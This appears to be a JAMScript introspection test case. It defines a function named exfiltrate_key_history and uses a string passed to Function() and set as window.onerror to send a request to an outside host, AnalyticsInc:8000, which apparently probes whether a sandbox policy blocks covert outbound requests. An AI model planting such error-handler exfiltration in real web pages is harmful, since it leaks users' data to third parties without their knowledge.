introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  window.NotExistingFunction();
  return
}
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=error1", true);xmlhttp.send(null);';
var v0 = window;
var v2 = Function(exp);
v0.onerror = v2;
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

}
